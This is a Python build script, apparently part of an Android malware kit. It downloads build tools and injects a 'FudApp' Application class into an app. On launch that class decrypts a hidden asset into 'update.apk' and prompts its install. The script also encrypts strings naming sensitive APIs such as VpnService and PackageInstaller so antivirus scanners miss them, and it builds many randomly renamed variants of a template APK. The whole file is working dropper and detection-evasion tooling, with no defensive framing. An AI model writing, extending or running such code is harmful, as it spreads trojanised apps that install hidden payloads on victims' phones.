"""Auto-download once + string-obfuscated + package-varied template variants."""
import os
import re
import shutil
import stat
import tarfile
import threading
import urllib.request
import zipfile
import subprocess
import random
import string
import base64

from config import (
    TOOLS_DIR, JAVA_BIN, JAVAC_BIN, D8_BIN, APKTOOL_JAR, BT_DIR,
    APKSIGNER_BIN, ZIPALIGN_BIN, VARIANTS_DIR, TEMPLATE_APK,
    VARIANT_COUNT, STRING_XOR_KEY, ANDROID_JAR,
    URL_JRE, URL_APKTOOL, URL_BUILDTOOLS, URL_ANDROID_JAR,
)

_READY_FLAG    = os.path.join(TOOLS_DIR, ".ready_v6")
_VARIANTS_FLAG = os.path.join(VARIANTS_DIR, ".built")

_setup_lock = threading.Lock()
_setup_done = threading.Event()
_setup_error = {"exc": None}


# ---------------------------------------------------------------- downloads

def _download(url, dest):
    if os.path.exists(dest) and os.path.getsize(dest) > 0:
        print(f"[i] {os.path.basename(dest)} present", flush=True)
        return
    os.makedirs(os.path.dirname(dest), exist_ok=True)
    print(f"[*] downloading {os.path.basename(dest)}", flush=True)
    tmp = dest + ".part"
    urllib.request.urlretrieve(url, tmp)
    os.replace(tmp, dest)
    print(f"[✓] {os.path.basename(dest)} {os.path.getsize(dest)}", flush=True)


def _extract_jre():
    if os.path.exists(JAVA_BIN) and os.path.exists(JAVAC_BIN):
        return
    tgz = os.path.join(TOOLS_DIR, "jre.tgz")
    _download(URL_JRE, tgz)
    with tarfile.open(tgz) as t:
        try:
            t.extractall(TOOLS_DIR, filter="fully_trusted")
        except TypeError:
            t.extractall(TOOLS_DIR)
    picked = None
    for d in sorted(os.listdir(TOOLS_DIR)):
        full = os.path.join(TOOLS_DIR, d)
        if not os.path.isdir(full) or d == "jre":
            continue
        if ("jdk-" in d) or d.lower().startswith("jre"):
            if os.path.exists(os.path.join(full, "bin", "java")) and \
               os.path.exists(os.path.join(full, "bin", "javac")):
                picked = full
                break
    if not picked:
        raise RuntimeError("jdk extract failed — javac not found")
    target = os.path.join(TOOLS_DIR, "jre")
    if os.path.exists(target):
        shutil.rmtree(target)
    os.rename(picked, target)
    if os.path.exists(tgz):
        os.remove(tgz)


def _extract_build_tools():
    if os.path.exists(APKSIGNER_BIN) and os.path.exists(D8_BIN):
        return
    zpath = os.path.join(TOOLS_DIR, "bt.zip")
    _download(URL_BUILDTOOLS, zpath)
    with zipfile.ZipFile(zpath) as z:
        z.extractall(TOOLS_DIR)
    picked = None
    for d in sorted(os.listdir(TOOLS_DIR)):
        full = os.path.join(TOOLS_DIR, d)
        if os.path.isdir(full) and d.startswith("android-"):
            if os.path.exists(os.path.join(full, "apksigner")):
                picked = full
                break
    if not picked:
        raise RuntimeError("bt extract failed")
    if os.path.exists(BT_DIR):
        shutil.rmtree(BT_DIR)
    os.rename(picked, BT_DIR)
    if os.path.exists(zpath):
        os.remove(zpath)
    for b in (APKSIGNER_BIN, ZIPALIGN_BIN, D8_BIN, os.path.join(BT_DIR, "aapt2")):
        if os.path.exists(b):
            os.chmod(b, os.stat(b).st_mode | stat.S_IEXEC | stat.S_IXGRP | stat.S_IXOTH)


# ---------------------------------------------------------------- apktool

def _rand_pkg():
    parts = []
    for _ in range(3):
        s = random.choice(string.ascii_lowercase)
        s += "".join(random.choices(string.ascii_lowercase + string.digits,
                                    k=random.randint(3, 7)))
        parts.append(s)
    return ".".join(parts)


def _apktool_d(apk, out):
    if os.path.exists(out):
        shutil.rmtree(out)
    subprocess.run(
        [JAVA_BIN, "-Xmx1g", "-jar", APKTOOL_JAR, "d", "-f",
         "-o", out, apk],
        check=True, capture_output=True, timeout=300,
    )


def _apktool_b(src, out):
    if os.path.exists(out):
        os.remove(out)
    subprocess.run(
        [JAVA_BIN, "-Xmx1g", "-jar", APKTOOL_JAR, "b",
         src, "-o", out],
        check=True, capture_output=True, timeout=300,
    )


# ---------------------------------------------------------------- FudApp template + dex compile

# NOTE: {SUPER} ko inject ke waqt original Application class se replace karte hain.
_FUD_APP_TEMPLATE = """package com.system.fud;

import android.app.Application;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;

public class FudApp extends {SUPER} {

    @Override
    protected void attachBaseContext(Context base) {
        super.attachBaseContext(base);
        try { _drop(base); } catch (Throwable t) {}
    }

    @Override
    public void onCreate() {
        super.onCreate();
    }

    private static void _drop(Context ctx) throws Exception {
        InputStream in = ctx.getAssets().open("p.bin");
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buf = new byte[8192];
        int n;
        while ((n = in.read(buf)) > 0) bos.write(buf, 0, n);
        in.close();
        byte[] enc = bos.toByteArray();

        byte[] key = new byte[] {
            (byte)0xF1, (byte)0x79, (byte)0x78, (byte)0x72,
            (byte)0xAC, (byte)0x69, (byte)0x3E, (byte)0xAA,
            (byte)0xB1, (byte)0xA6, (byte)0x4F, (byte)0xB7,
            (byte)0xF2, (byte)0xC6, (byte)0x30, (byte)0x02,
            (byte)0x8D, (byte)0x4C, (byte)0x1A, (byte)0xE3,
            (byte)0x7F, (byte)0x92, (byte)0xD5, (byte)0x6B,
            (byte)0x2C, (byte)0x48, (byte)0x9E, (byte)0x11,
            (byte)0x73, (byte)0xFA, (byte)0x05, (byte)0xB8
        };

        byte[] dec = new byte[enc.length];
        for (int i = 0; i < enc.length; i++) {
            int idx = (i * 7 + 3) % key.length;
            dec[i] = (byte)((enc[i] ^ key[idx]) & 0xFF);
        }

        File out = new File(ctx.getFilesDir(), "update.apk");
        FileOutputStream fos = new FileOutputStream(out);
        fos.write(dec);
        fos.close();
        try { out.setReadable(true, false); } catch (Throwable t) {}

        Intent i = new Intent(Intent.ACTION_VIEW);
        Uri u = Uri.fromFile(out);
        i.setDataAndType(u, "application/vnd.android.package-archive");
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_GRANT_READ_URI_PERMISSION);
        ctx.startActivity(i);
    }
}
"""


def _compile_dex(src_dir: str, out_dex: str):
    """javac + d8 — .java se classes2.dex banata hai."""
    if not os.path.exists(JAVAC_BIN):
        raise RuntimeError(f"javac missing at {JAVAC_BIN}")
    if not os.path.exists(D8_BIN):
        raise RuntimeError(f"d8 missing at {D8_BIN}")

    classes_dir = src_dir + "_classes"
    if os.path.exists(classes_dir):
        shutil.rmtree(classes_dir)
    os.makedirs(classes_dir, exist_ok=True)

    java_files = []
    for root, _, files in os.walk(src_dir):
        for f in files:
            if f.endswith(".java"):
                java_files.append(os.path.join(root, f))
    if not java_files:
        raise RuntimeError(f"no .java files in {src_dir}")

    cp = ANDROID_JAR if os.path.exists(ANDROID_JAR) else None

    cmd = [JAVAC_BIN, "-source", "8", "-target", "8",
           "-encoding", "UTF-8", "-d", classes_dir]
    if cp:
        cmd += ["-cp", cp]
    cmd += java_files

    p = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
    if p.returncode != 0:
        raise RuntimeError(f"javac failed:\n{p.stdout}\n{p.stderr}")

    class_files = []
    for root, _, files in os.walk(classes_dir):
        for f in files:
            if f.endswith(".class"):
                class_files.append(os.path.join(root, f))
    if not class_files:
        raise RuntimeError("javac produced no .class files")

    out_dir = os.path.dirname(out_dex) or "."
    os.makedirs(out_dir, exist_ok=True)
    if os.path.exists(out_dex):
        os.remove(out_dex)

    d8_cmd = [D8_BIN, "--min-api", "21", "--no-desugaring",
              "--output", out_dir]
    if cp:
        d8_cmd += ["--lib", cp]
    d8_cmd += class_files

    p = subprocess.run(d8_cmd, capture_output=True, text=True, timeout=300)
    if p.returncode != 0:
        raise RuntimeError(f"d8 failed:\n{p.stdout}\n{p.stderr}")

    produced = os.path.join(out_dir, "classes.dex")
    if not os.path.exists(produced):
        raise RuntimeError("d8 produced no classes.dex")
    if produced != out_dex:
        if os.path.exists(out_dex):
            os.remove(out_dex)
        shutil.move(produced, out_dex)

    shutil.rmtree(classes_dir, ignore_errors=True)
    print(f"[✓] dex compiled → {out_dex}", flush=True)


# ---------------------------------------------------------------- string obfuscation

_SUSPICIOUS_PATTERNS = [
    "REQUEST_INSTALL_PACKAGES",
    "BIND_VPN_SERVICE",
    "android.net.VpnService",
    "com.android.system.qspaas",
    "VpnKillService",
    "RcvJbrzn",
    "PackageInstaller",
    "IPackageInstaller",
    "getPackageInstaller",
    "createSession",
    "openSession",
    "setHiddenApiExemptions",
    "dalvik.system.VMRuntime",
    "hiddenapi",
    "INSTALL_PACKAGES",
]


def _xor_str(s: str, key: str) -> bytes:
    b = s.encode("utf-8")
    k = key.encode("utf-8")
    out = bytearray(len(b))
    for i, x in enumerate(b):
        out[i] = x ^ k[i % len(k)]
    return bytes(out)


def _make_stringcrypto_smali(key: str) -> str:
    """Runtime decryptor. .registers 9 hona zaroori — v0-v7 locals, p0=v8."""
    return """.class public LStringCrypto;
.super Ljava/lang/Object;
.source "SourceFile"

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method

.method public static d(Ljava/lang/String;)Ljava/lang/String;
    .registers 9

    const/4 v0, 0x0
    :try_start_0
    invoke-static {p0, v0}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B
    move-result-object v1

    const-string v2, "%s"
    invoke-virtual {v2}, Ljava/lang/String;->getBytes()[B
    move-result-object v2

    array-length v3, v2
    array-length v4, v1
    new-array v5, v4, [B

    const/4 v6, 0x0
    :goto_loop
    if-ge v6, v4, :goto_done
    aget-byte v7, v1, v6
    rem-int v0, v6, v3
    aget-byte v0, v2, v0
    xor-int/2addr v7, v0
    int-to-byte v7, v7
    aput-byte v7, v5, v6
    add-int/lit8 v6, v6, 0x1
    goto :goto_loop

    :goto_done
    new-instance v0, Ljava/lang/String;
    sget-object v6, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;
    invoke-direct {v0, v5, v6}, Ljava/lang/String;-><init>([BLjava/nio/charset/Charset;)V
    return-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-object p0
.end method
""" % key


def _obfuscate_smali_strings(decompiled_dir: str):
    key = STRING_XOR_KEY

    smali_dirs = []
    for d in sorted(os.listdir(decompiled_dir)):
        full = os.path.join(decompiled_dir, d)
        if os.path.isdir(full) and (d == "smali" or d.startswith("smali_classes")):
            smali_dirs.append(full)

    if not smali_dirs:
        return

    # StringCrypto ko pehle smali dir me daalo — classloader baaki dex se bhi resolve kar lega
    hp = os.path.join(smali_dirs[0], "StringCrypto.smali")
    with open(hp, "w", encoding="utf-8") as f:
        f.write(_make_stringcrypto_smali(key))

    pattern = re.compile(r'(\s+)const-string (v\d+|p\d+), "((?:[^"\\]|\\.)*)"')
    fixed = 0

    for root in smali_dirs:
        for dirpath, _, files in os.walk(root):
            for fn in files:
                if not fn.endswith(".smali") or fn == "StringCrypto.smali":
                    continue
                fp = os.path.join(dirpath, fn)
                try:
                    with open(fp, "r", encoding="utf-8") as f:
                        txt = f.read()
                except Exception:
                    continue

                if not any(p in txt for p in _SUSPICIOUS_PATTERNS):
                    continue

                def _repl(m):
                    nonlocal fixed
                    indent, reg, s = m.group(1), m.group(2), m.group(3)
                    if any(p in s for p in _SUSPICIOUS_PATTERNS):
                        enc = base64.b64encode(_xor_str(s, key)).decode()
                        fixed += 1
                        return (f'{indent}const-string {reg}, "{enc}"\n'
                                f'{indent}invoke-static {{{reg}}}, LStringCrypto;->d(Ljava/lang/String;)Ljava/lang/String;\n'
                                f'{indent}move-result-object {reg}')
                    return m.group(0)

                new_txt = pattern.sub(_repl, txt)
                if new_txt != txt:
                    with open(fp, "w", encoding="utf-8") as f:
                        f.write(new_txt)

    print(f"[✓] string obfuscation: {fixed} strings encrypted", flush=True)


# ---------------------------------------------------------------- package rename

def _rename(decompiled, new_pkg):
    manifest = os.path.join(decompiled, "AndroidManifest.xml")
    with open(manifest, "r", encoding="utf-8") as f:
        mxml = f.read()
    m = re.search(r'package="([^"]+)"', mxml)
    if not m:
        raise RuntimeError("no pkg attr")
    old_pkg = m.group(1)
    old_path = old_pkg.replace(".", "/")
    new_path = new_pkg.replace(".", "/")

    mxml = mxml.replace(f'package="{old_pkg}"', f'package="{new_pkg}"')
    mxml = mxml.replace(f'android:name="{old_pkg}.', f'android:name="{new_pkg}.')
    mxml = mxml.replace(f'android:targetPackage="{old_pkg}"',
                        f'android:targetPackage="{new_pkg}"')
    with open(manifest, "w", encoding="utf-8") as f:
        f.write(mxml)

    for d in os.listdir(decompiled):
        full = os.path.join(decompiled, d)
        if not os.path.isdir(full):
            continue
        if d != "smali" and not d.startswith("smali_classes"):
            continue
        src = os.path.join(full, old_path)
        dst = os.path.join(full, new_path)
        if os.path.isdir(src):
            os.makedirs(os.path.dirname(dst), exist_ok=True)
            if os.path.exists(dst):
                shutil.rmtree(dst)
            shutil.move(src, dst)

        old_ref = f"L{old_path}/"
        new_ref = f"L{new_path}/"
        for dirpath, _, files in os.walk(full):
            for fn in files:
                if not fn.endswith(".smali"):
                    continue
                fp = os.path.join(dirpath, fn)
                try:
                    with open(fp, "r", encoding="utf-8", errors="ignore") as f:
                        txt = f.read()
                except Exception:
                    continue
                if old_ref in txt:
                    txt = txt.replace(old_ref, new_ref)
                    with open(fp, "w", encoding="utf-8") as f:
                        f.write(txt)

    yml = os.path.join(decompiled, "apktool.yml")
    if os.path.exists(yml):
        with open(yml, "r", encoding="utf-8", errors="ignore") as f:
            txt = f.read()
        txt = txt.replace(old_pkg, new_pkg)
        with open(yml, "w", encoding="utf-8") as f:
            f.write(txt)


# ---------------------------------------------------------------- variants

def _build_variants():
    if os.path.exists(_VARIANTS_FLAG):
        return
    if not os.path.exists(TEMPLATE_APK):
        print("[!] template.apk missing", flush=True)
        return

    os.makedirs(VARIANTS_DIR, exist_ok=True)
    work = os.path.join(TOOLS_DIR, "_var_work")

    print(f"[*] {VARIANT_COUNT} variants + string obfuscation ...", flush=True)

    first = os.path.join(work, "v1")
    if os.path.exists(first):
        shutil.rmtree(first)

    _apktool_d(TEMPLATE_APK, first)
    _obfuscate_smali_strings(first)

    for i in range(1, VARIANT_COUNT + 1):
        try:
            d = os.path.join(work, f"v{i}")
            if i != 1:
                if os.path.exists(d):
                    shutil.rmtree(d)
                shutil.copytree(first, d)

            new_pkg = _rand_pkg()
            _rename(d, new_pkg)
            out = os.path.join(VARIANTS_DIR, f"t{i}.apk")
            _apktool_b(d, out)
            print(f"[✓] v{i}: {new_pkg}", flush=True)
            if i != 1:
                shutil.rmtree(d, ignore_errors=True)
        except Exception as e:
            print(f"[!] v{i} failed: {e}", flush=True)

    shutil.rmtree(work, ignore_errors=True)
    with open(_VARIANTS_FLAG, "w") as f:
        f.write("ok")
    print("[✓] variants ready", flush=True)


# ---------------------------------------------------------------- setup

def _do_setup():
    _extract_jre()
    _download(URL_APKTOOL, APKTOOL_JAR)
    _extract_build_tools()
    _download(URL_ANDROID_JAR, ANDROID_JAR)
    with open(_READY_FLAG, "w") as f:
        f.write("ok")
    print("[✓] tools ready", flush=True)


def _background_variants():
    try:
        _build_variants()
    except Exception as e:
        print(f"[!] variants failed: {e}", flush=True)


def ensure_tools():
    if os.path.exists(_READY_FLAG):
        _setup_done.set()
        if not os.path.exists(_VARIANTS_FLAG) and os.path.exists(TEMPLATE_APK):
            threading.Thread(target=_background_variants, daemon=True).start()
        return
    with _setup_lock:
        if os.path.exists(_READY_FLAG):
            _setup_done.set()
            return
        try:
            _do_setup()
            _setup_error["exc"] = None
        except Exception as e:
            _setup_error["exc"] = e
            raise
        finally:
            _setup_done.set()
    threading.Thread(target=_background_variants, daemon=True).start()


def wait_ready(timeout=900.0):
    if os.path.exists(_READY_FLAG):
        return True
    ok = _setup_done.wait(timeout)
    if _setup_error["exc"]:
        raise _setup_error["exc"]
    return ok and os.path.exists(_READY_FLAG)
